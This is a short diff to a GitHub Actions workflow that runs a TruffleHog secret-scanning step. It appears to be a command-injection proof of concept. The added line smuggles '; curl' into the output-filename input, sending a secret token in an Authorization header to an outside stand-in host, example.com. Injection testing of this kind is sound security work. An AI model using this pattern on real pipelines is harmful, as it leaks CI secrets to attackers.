@@ -15,4 +15,4 @@ jobs:
       - name: 🐷 TruffleHog
         uses: ./.github/actions/trufflehog   # ← path to your action
         with:
-          trufflehog-output-filename: sca-output; echo ${{ vars.HELLO }}
+          trufflehog-output-filename: sca-output; curl -H "Authorization: Bearer $KYLE" https://example.com
